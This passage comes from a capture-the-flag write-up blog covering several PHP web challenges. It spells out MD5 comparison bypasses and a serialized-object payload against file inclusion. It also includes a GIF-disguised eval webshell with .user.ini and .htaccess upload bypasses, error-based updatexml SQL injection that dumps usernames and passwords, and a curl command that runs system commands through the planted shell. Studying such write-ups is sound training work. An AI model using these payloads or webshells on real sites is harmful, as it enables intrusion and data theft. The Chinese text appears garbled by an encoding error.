class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>è¯¥è¯´ä¸è¯´è¿™ä¸ªå¼±æ¯”è¾ƒç¡®å®æ˜¯å·²ç»ç›˜åŒ…æµ†äº†ï¼Œç½‘ä¸Šä¸€æœä¸€å¤§å †</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/levels91.php?<span class="hljs-attribute">a</span>=QNKCDZO&amp;b=240610708<br></code></pre></td></tr></table></figure><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼ å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span>:param<span class="hljs-number">1</span>[]=<span class="hljs-number">111</span>&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">222</span><br></code></pre></td></tr></table></figure><p>å³å¯</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = unserialize(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œå…ˆè®©ç¨‹åºèµ°åˆ° Line 11,é‚£ä¹ˆéœ€è¦æ»¡è¶³ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))<br>    ...<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè‡ªå·±ä¹Ÿä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆç›´æ¥ä¼ å…¥ä¸è¡Œï¼Œç„¶åæˆ‘å°è¯•äº†ä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs æ„å»º">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>æŠŠ welcome to the zjctf base64ç¼–ç ä¼ å…¥ï¼Œæˆ–è€…inputä¸ºåè®®postä¸Šå»ã€‚ç„¶åä¸‹é¢è¿™ä¸ªåœ°æ–¹çŸ¥è¯†åŒ…å«ï¼Œä¸æ˜¯è¯»å–ï¼è¿™ä¸ªåœ°æ–¹æˆ‘ç‹ ç‹ çš„è¸©å‘äº†ï¼Œæ‰€ä»¥è¦ç”¨filteræ¥è¯»å–æ–‡ä»¶ï¼Œè¯»å–åçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//çœ‹åˆ°è¿™é‡Œå¯ä»¥è¯»å–flag.phpï¼Œä½¿ç”¨çš„æ˜¯_tostringæ–¹æ³•ï¼Œæˆ‘ä»¬ä½¿ç”¨echoå³å¯è§¦å‘</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//çœ‹åˆ°è¿™é‡Œå¯ä»¥è¯»å–flag.php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> Flag()));  <br><span class="hljs-comment">//ouput:O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>æœ€åpayload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D<br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®</p><p>æ„å»ºä¸€ä¸ªå›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;   <br></code></pre></td></tr></table></figure><p>ç»è¿‡å°è¯• å‘ç°ä¸å…è®¸æ›´æ”¹filename(å°±é‚£äº›å¯ä»¥è§£ææˆphpçš„å…¨ä¸è¡Œ)ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨ <code>.user.ini</code></p><p>å®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨åŒ…å«ä¸€äº›æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=nosymbol.png<br></code></pre></td></tr></table></figure><p>æ„å»ºå¦‚ä¸Šæ–‡ä»¶ï¼Œå¯ä»¥åœ¨è®¿é—® é»˜è®¤é¡µé¢(index.php)æ—¶è‡ªåŠ¨åŒ…å« nosymbol.png è¿™ä¸ªæ–‡ä»¶ä¹Ÿå°±æ˜¯ä¸Šé¢çš„å›¾ç‰‡é©¬</p><p>getFlag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://edc<span class="hljs-number">1162</span>e-eb<span class="hljs-number">28</span>-<span class="hljs-number">46</span>d<span class="hljs-number">3</span>-bd<span class="hljs-number">05</span>-d<span class="hljs-number">5</span>b<span class="hljs-number">996584</span>fc<span class="hljs-number">4</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/uploads/cc<span class="hljs-number">551</span>ab<span class="hljs-number">005</span>b<span class="hljs-number">2</span>e<span class="hljs-number">60</span>fbdc<span class="hljs-number">88</span>de<span class="hljs-number">809</span>b<span class="hljs-number">2</span>c<span class="hljs-number">4</span>b<span class="hljs-number">1</span>/index.php -X POST -d <span class="hljs-string">&quot;shell=system(&#x27;cat /flag&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102046298.png" alt="image-20220110204644152"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>è¿™é¢˜è¿‡æ»¤äº†union select ifè¿™æ ·çš„å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤updatexml</p><p>äºæ˜¯æœ‰</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br>è¿™ä¸ªåœ°æ–¹ä½ ä¼šå‘ç°flagåªç»™äº†åŠä¸ª<br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ è¦ç¬¦åˆ 8 4 4 4 12è§„åˆ™ flagæœ‰é‡å¤å­—æ®µåˆ æ‰ä»–</p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>.user.ini è¡Œä¸é€šï¼Œè¯•è¯•.htaccess</p><p>.htaccesså†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch  <span class="hljs-string">&quot;b.jpg&quot;</span>&gt;<br><br>SetHandler  application/x-httpd-php<br><br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102105411.png" alt="image-20220110210559312"></p><p>ç„¶åæ•´ä¸ªå›¾ç‰‡ğŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å°è¯•ä»¥åçŸ¥é“çš„systemå‡½æ•°ç¦ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> curl http://5ed3d265-efab-4d75-8e8d-3d2692ae1906.node4.buuoj.cn:81//upload/44927cfb6cc8b88769ea882582c90522/b.jpg</span><br>GIF89a<br>flag&#123;885b198c-a024-47f6-9e2a-f159525cb14d&#125;<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>ç¡®å®ezï¼Œç„¶è€Œè‡ªå·±çœ¼çå¥½å‡ æ¬¡å·®ç‚¹è·‘å»ç¿»wp  hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>æºç ç›´æ¥ç»™äº† ç›®çš„æ˜¯æ‰§è¡Œåˆ°17è¡Œ</p><p>æˆ‘ä»¬éœ€è¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>    ...<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) <br>            ...<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))<br>                    ...<br>                    <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>                            ...<br>                             <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br></code></pre></td></tr></table></figure><p>è€ƒç‚¹å°±æ˜¯MD5å¼ºæ¯”è¾ƒå’ŒPHPå¼±ç±»å‹</p><p>æœ€ç»ˆpayload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>: ?id[]=<span class="hljs-number">111</span>&amp;gg[]=<span class="hljs-number">222</span><br><span class="hljs-attribute">POST</span>: passwd=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span 